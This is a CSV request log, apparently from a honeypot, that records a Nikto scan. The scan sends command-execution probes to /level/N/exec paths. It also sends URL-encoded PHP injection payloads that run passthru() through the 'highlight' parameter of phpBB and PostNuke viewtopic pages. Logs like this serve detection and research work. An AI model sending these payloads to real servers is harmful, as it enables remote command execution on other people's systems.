timestamp,method,path,status,ip,port,uuid,sess_uuid,detection_name,detection_type,user_agent,referer
2025-05-20T07:33:04.911236,GET,/level/38/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,38dba85f-128e-49c7-84e2-1376d043bd55,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001285),
2025-05-20T07:33:04.915661,GET,/level/39/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,a3f7b344-7a2d-4290-ba9e-2aeb4eb32929,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001286),
2025-05-20T07:33:04.920020,GET,/level/40/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,e767c5c0-f5fb-499a-9591-122945673e1a,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001287),
2025-05-20T07:33:04.925181,GET,/level/41/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,369846a7-cdbd-4f51-8c0b-eeae578827d4,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001288),
2025-05-20T07:33:04.929200,GET,/level/42/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,2a82996f-aa31-4a9a-ab1b-c9b57ae69451,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001289),
2025-05-20T07:33:04.934708,GET,/level/43/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,bde58ac7-3963-4d6f-bb19-d1829a754698,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001290),
2025-05-20T07:33:04.939433,GET,/level/44/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,41fbc2c3-a10e-4d27-bc28-5dbea8909a1a,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001291),
2025-05-20T07:33:04.943585,GET,/level/45/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,6982d13c-1e14-49e5-8513-e378d61069ee,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001292),
2025-05-20T07:33:04.948101,GET,/level/46/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,539576f2-f299-4677-ae15-0534591c7874,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001293),
2025-05-20T07:33:04.952528,GET,/level/47/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,f226a4d9-dc6d-4c77-86f5-1c57a3a8fe88,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001294),
2025-05-20T07:33:04.956585,GET,/level/48/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,89425d16-8389-4842-99f1-a730caab3f28,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001295),
2025-05-20T07:33:04.960705,GET,/level/49/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,1aca3c7f-f01e-4baf-a221-17a8cd3e8b93,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001296),
2025-05-20T07:33:04.965528,GET,/level/50/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,6d32f6f1-6720-4700-8451-6dafb7b61e8b,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001297),
2025-05-20T07:33:04.971781,GET,/level/51/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,fad5e922-9a17-47ac-8a26-bf722c5b9187,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001298),
2025-05-20T07:33:04.976191,GET,/level/52/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,fc0bebfb-a755-4e4a-bc16-be089b1d2083,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001299),
2025-05-20T07:33:04.981806,GET,/level/53/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,9992e60c-fcdf-4910-ab24-0326fc80a436,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001300),
2025-05-20T07:33:04.986479,GET,/level/54/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,a5aa1d42-b64b-4080-9d78-67e36cb5e28a,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001301),
2025-05-20T07:33:04.990851,GET,/level/55/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,2a7022c8-81fc-4270-b587-06d16194b8f0,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001302),
2025-05-20T07:33:04.995501,GET,/level/56/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,96a65404-e26d-4a5a-87d8-bd42a7405720,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001303),
2025-05-20T07:33:04.999861,GET,/level/57/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,47b39991-ea67-43e2-9bee-15322aff14ee,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001304),
2025-05-20T07:33:05.004496,GET,/level/58/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,437ea985-c8df-4b25-9d86-3e9bf028a993,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001305),
2025-05-20T07:33:05.009564,GET,/level/59/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,084f3ef0-9d1b-40e3-9e84-0a508d3468ab,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001306),
2025-05-20T07:33:05.013685,GET,/level/60/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,bbba8d1c-0989-4d45-851c-1f6d1c40d084,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001307),
2025-05-20T07:33:05.019312,GET,/level/61/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,b4c0cfee-df2b-4ab4-8e47-44a756a2418d,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001308),
2025-05-20T07:33:05.023279,GET,/level/62/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,d248e1e1-0e18-41c3-a2a8-be006d628866,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001309),
2025-05-20T07:33:05.028277,GET,/level/63/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,7c2d363b-6c0c-4c8d-888b-34deb4bfd0aa,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001310),
2025-05-20T07:33:05.032698,GET,/level/64/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,a4099eb0-a47a-4a9f-b23d-ff6abfeed7a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001311),
2025-05-20T07:33:05.036820,GET,/level/65/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,2c216b8c-2f17-47c1-9720-391f5cd227fa,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001312),
2025-05-20T07:33:05.041391,GET,/level/66/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,7b057efb-91f2-49ae-b259-1e6922666c17,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001313),
2025-05-20T07:33:05.045485,GET,/level/67/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,295033be-6967-4e41-a6a0-a77bf0acaf67,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001314),
2025-05-20T07:33:05.049801,GET,/level/68/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,04d88b44-b5ed-434a-adcb-8c9300439849,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001315),
2025-05-20T07:33:05.053884,GET,/level/69/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,da6803f7-d35c-42b8-a44f-9f291e646ea6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001316),
2025-05-20T07:33:05.058979,GET,/level/70/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,40434472-d667-458e-bb8b-eb762e5e7217,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001317),
2025-05-20T07:33:05.065727,GET,/level/71/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,ba9b945f-f3d0-4066-af80-a6bf05c35b66,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001318),
2025-05-20T07:33:05.070601,GET,/level/72/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,94dca5e5-f9eb-436b-8f64-380e24768eb1,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001319),
2025-05-20T07:33:05.075252,GET,/level/73/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,f012cd2a-cc97-4360-963a-4317659c53c4,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001320),
2025-05-20T07:33:05.079243,GET,/level/74/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,df95ab08-c451-46a5-8f87-4675dc8ea38e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001321),
2025-05-20T07:33:05.083850,GET,/level/75/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,68ff5627-3c91-4fd0-a9a4-1f916d7ad7ba,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001322),
2025-05-20T07:33:05.088616,GET,/level/76/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,b83557fe-96b9-4759-a7e4-e04b554b5fc0,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001323),
2025-05-20T07:33:05.093011,GET,/level/77/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,e2389753-8be9-4cac-8f2f-d01c0847c175,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001324),
2025-05-20T07:33:05.097028,GET,/level/78/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,8976160b-82f3-4936-9d69-20fed943754e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001325),
2025-05-20T07:33:05.101361,GET,/level/79/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,af0ed305-c5b0-4805-a235-887e38a209e2,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001326),
2025-05-20T07:33:05.106011,GET,/level/80/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,ab2ec09a-1d4f-4298-9b5f-edda82e1e001,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001327),
2025-05-20T07:33:05.111262,GET,/level/81/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,79f3b48d-4c1e-4b5c-83df-5f514a363131,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001328),
2025-05-20T07:33:05.115476,GET,/level/82/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,d71905d4-2426-4827-94dd-57117f9a1d78,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001329),
2025-05-20T07:33:05.120283,GET,/level/83/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,a6c804b0-6e0a-458d-9711-545c3d25b6f2,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001330),
2025-05-20T07:33:05.124457,GET,/level/84/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,0d0f16b5-cb6f-412a-b019-097132498c97,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001331),
2025-05-20T07:33:05.128555,GET,/level/85/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,c4fc78c3-44a9-4b68-aed1-b86610c2bb9e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001332),
2025-05-20T07:33:05.133287,GET,/level/86/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,4bde24b8-a231-4ac0-bcd1-59c20e12284f,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001333),
2025-05-20T07:33:05.137589,GET,/level/87/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,ac6e8e1e-0363-4f23-b1ed-4d7e499651a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001334),
2025-05-20T07:33:05.141638,GET,/level/88/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,8bc4c221-bc47-4bd6-b81f-735cc6dd9c0b,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001335),
2025-05-20T07:33:05.145668,GET,/level/89/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,d016d5ce-b501-46b6-bf06-48ec1bdb9e3f,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001336),
2025-05-20T07:33:05.150474,GET,/level/90/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,530b63bf-a164-4720-b120-e763bcd7de80,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001337),
2025-05-20T07:33:05.155838,GET,/level/91/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,aa88a025-d88d-41f1-a2f4-cc0db38ed8d9,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001338),
2025-05-20T07:33:05.159814,GET,/level/92/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,4be4b952-5951-46cc-ae77-84ada79e6322,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001339),
2025-05-20T07:33:05.164304,GET,/level/93/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,ca641ef8-7317-4f02-b27e-017229d40c27,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001340),
2025-05-20T07:33:05.168763,GET,/level/94/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,1d3ed917-9cde-41e1-9a43-abaf1e75146a,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001341),
2025-05-20T07:33:05.172734,GET,/level/95/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,db7ffeee-2350-4a7c-8ae5-b78fef99bacc,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001342),
2025-05-20T07:33:05.176770,GET,/level/96/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,3a43f9aa-2869-4a8e-a29d-afa43a2651ce,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001343),
2025-05-20T07:33:05.181855,GET,/level/97/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,6e76dce7-bfa4-4abb-bc89-25b4c699b3d6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001344),
2025-05-20T07:33:05.186259,GET,/level/98/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,330b5a99-5148-40f3-addd-4c1fef6f9ebe,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001345),
2025-05-20T07:33:05.190204,GET,/level/99/exec//show,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,7c0fd89e-90c3-49dd-8ecd-c4b596717c45,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001346),
2025-05-20T07:33:05.195266,GET,/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,4b9026cc-a942-41ef-8a57-36f77d84626f,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001388),
2025-05-20T07:33:05.201719,GET,/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,01cd6d95-c79e-44fe-9157-609f3b321cde,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001389),
2025-05-20T07:33:05.206706,GET,/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:33:05.211882,GET,/postnuke/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:33:05.217158,GET,/postnuke/html/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:33:05.221971,GET,/modules/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:33:05.227194,GET,/phpBB/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:33:05.232466,GET,/forum/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:33:05.237122,GET,/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:33:05.242296,GET,/postnuke/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:33:05.247571,GET,/postnuke/html/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:33:05.254187,GET,/modules/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:33:05.259748,GET,/phpBB/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:33:05.264824,GET,/forum/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,904fa231-faf2-4b0c-b169-db80067ba1a6,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390),
2025-05-20T07:33:05.269730,GET,/index.php?Nikto=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:33:05.275451,GET,/postnuke/index.php?Nikto=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:33:05.280630,GET,/postnuke/html/index.php?Nikto=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:33:05.285866,GET,/modules/index.php?Nikto=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:33:05.291522,GET,/phpBB/index.php?Nikto=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:33:05.296215,GET,/forum/index.php?Nikto=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:33:05.301151,GET,/index.php?name=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:33:05.308045,GET,/postnuke/index.php?name=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
